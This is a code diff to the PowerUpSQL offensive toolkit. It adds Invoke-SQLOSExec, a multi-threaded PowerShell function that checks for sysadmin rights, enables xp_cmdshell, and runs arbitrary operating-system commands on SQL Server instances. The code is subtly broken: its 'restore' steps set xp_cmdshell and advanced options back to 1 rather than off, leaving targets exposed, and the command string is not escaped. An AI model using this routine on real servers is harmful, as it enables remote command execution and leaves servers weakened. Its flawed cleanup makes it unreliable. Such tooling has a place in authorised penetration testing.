@@ -12,7 +12,7 @@ The PowerUpSQL is an offensive toolkit designed to accomplish six goals:
 * Support SQL Server Auditing: Invoke-PowerUpSQL audits for common high impact vulnerabilities and weak configurations by default.
 * Support SQL Server Exploitation: Invoke-PowerUpSQL can leverage SQL Server vulnerabilities to obtain sysadmin privileges to illistrate risk.
 * Pipeline Support: Most functions support the pipeline so they can be used with other toolsets.
-#>
+
 
 ########## EXAMPLES: SQL Server Instance Discovery ##########
 # Locate SQL Server targets.
@@ -41,7 +41,7 @@ The PowerUpSQL is an offensive toolkit designed to accomplish six goals:
 # Add verbose message suppression options for core and common functions
 # Test all functions in the lab against SQL Server 2000-2016
 # Clean up formatting etc
-
+#>
 
 #########################################################################
 #
@@ -635,6 +635,216 @@ Function  Get-SQLQueryThreaded {
 #  Get-SQLCachePlan
 #  Get-SQLQueryHistory
 #  Get-SQLHiddenSystemObjects
+
+
+# ----------------------------------
+#  Invoke-SQLOSExec
+# ----------------------------------
+Function  Invoke-SQLOSExec {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$false,
+        HelpMessage="SQL Server or domain account to authenticate with.")]
+        [string]$Username,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="SQL Server or domain account password to authenticate with.")]
+        [string]$Password,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Windows credentials.")]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+        
+        [Parameter(Mandatory=$false,
+        ValueFromPipeline,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="SQL Server instance to connection to.")]
+        [string]$Instance,       
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Connect using Dedicated Admin Connection.")]
+        [Switch]$DAC,
+
+        [Parameter(Mandatory=$true,
+        HelpMessage="OS command to be executed.")]
+        [String]$Command,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Connection timeout.")]
+        [string]$TimeOut,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Number of threads.")]
+        [int]$Threads = 5,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Setup data table for output
+        $TblResults = New-Object System.Data.DataTable
+
+        # Setup data table for pipeline threading
+        $PipelineItems = New-Object System.Data.DataTable
+
+        # Ensure provide instance is processed
+        if($Instance){
+            $PipelineItems = $PipelineItems + $Instance
+        }
+    }
+
+    Process
+    {      
+      # Create list of pipeline items
+      $PipelineItems = $PipelineItems + $_         
+    }
+
+    End
+    {   
+	    # Define code to be multi-threaded
+        $MyScriptBlock = {                        
+                        
+            $Instance = $_.Instance
+            
+            # Parse computer name from the instance
+            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+            # Setup DAC string
+            if($DAC){
+
+                # Create connection object
+                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
+            }else{
+                # Create connection object
+                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
+            }
+
+            # Attempt connection
+            try{
+                # Open connection
+                $Connection.Open()                                              
+
+                if(-not $SuppressVerbose){
+                    Write-Verbose "$Instance : Connection Success."           
+                }
+               
+                # Switch to track xp_cmdshell status
+                $DisableShowAdvancedOptions = 0
+                $DisableXpCmdshell = 0
+
+                # Get sysadmin status
+                $IsSysadmin =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
+      
+                # Check if xp_cmdshell is enabled
+                if($IsSysadmin -eq "Yes"){
+                    Write-Verbose "$Instance : You are a sysadmin." 
+                    $IsXpCmdshellEnabled =  Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object config_value -ExpandProperty config_value
+                    $IsShowAdvancedEnabled =  Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object config_value -ExpandProperty config_value
+                }else{
+                    Write-Verbose "$Instance : You are not a sysadmin. This command requires sysadmin privileges." 
+                    return
+                }
+
+                # Enable show advanced options if needed
+                if ($IsShowAdvancedEnabled -eq 1){
+                    Write-Verbose "$Instance : Show Advanced Options is already enabled."
+                }else{
+                    Write-Verbose "$Instance : Show Advanced Options is disabled."
+                    $DisableShowAdvancedOptions = 1
+
+                    # Try to enable Show Advanced Options
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
+                    # Check if configuration change worked
+                    $IsShowAdvancedEnabled2 =  Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object config_value -ExpandProperty config_value
+
+                     if ($IsShowAdvancedEnabled2 -eq 1){
+                        Write-Verbose "$Instance : Enabled Show Advanced Options."
+                     }else{
+                        Write-Verbose "$Instance : Enabling Show Advanced Options failed. Aborting."
+                        return
+                     }
+                }
+
+                # Enable xp_cmdshell if needed
+                if ($IsXpCmdshellEnabled -eq 1){
+                    Write-Verbose "$Instance : xp_cmdshell is already enabled."
+                }else{
+                    Write-Verbose "$Instance : xp_cmdshell is disabled."
+                    $DisableXpCmdshell = 1
+
+                    # Try to enable xp_cmdshell
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
+                    # Check if configuration change worked
+                    $IsXpCmdshellEnabled2 =  Get-SQLQuery -Instance $Instance -Query "sp_configure xp_cmdshell" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object config_value -ExpandProperty config_value
+
+                     if ($IsXpCmdshellEnabled2 -eq 1){
+                        Write-Verbose "$Instance : Enabled xp_cmdshell."
+                     }else{
+                        Write-Verbose "$Instance : Enabling xp_cmdshell failed. Aborting."
+                        return
+                     }
+                }
+
+                # Setup OS command
+                Write-Verbose "$Instance : Running command: $Command"
+                $Query = "exec master..xp_cmdshell '$Command'"
+
+                # Setup SQL query
+                $SqlCommand = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)
+
+                # Grab results
+                $Results = $SqlCommand.ExecuteReader()                                         
+
+                # Load results into data table     
+                $TblResults.Load($Results)  
+
+                # Restore xp_cmdshell state if needed                
+                if($DisableXpCmdshell -eq 1){
+                    
+                    Write-Verbose "$Instance : Disabling xp_cmdshell"
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+                }
+
+                # Restore Show Advanced Options state if needed                
+                if($DisableShowAdvancedOptions -eq 1){
+                    
+                    Write-Verbose "$Instance : Disabling Show Advanced Options"
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+                }
+
+                # Close connection
+                $Connection.Close()
+
+                # Dispose connection
+                $Connection.Dispose() 
+
+            }catch{
+
+                # Connection failed       
+                                 
+                if(-not $SuppressVerbose){
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose "$Instance : Connection Failed."
+                    #Write-Verbose  " Error: $ErrorMessage"
+                }
+
+                # Add record
+                $TblResults.Rows.Add("$ComputerName","$Instance","Not Accessible") | Out-Null
+            }                      		
+        }         
+
+        # Run scriptblock using multi-threading
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                
+
+        return $TblResults
+    }
+}
 
 # ----------------------------------
 #  Get-SQLServerInfo
@@ -3656,6 +3866,9 @@ Function  Get-SQLStoredProcure {
         $TblProcs       
     }
 }
+
+
+
 #endregion
 
 #########################################################################
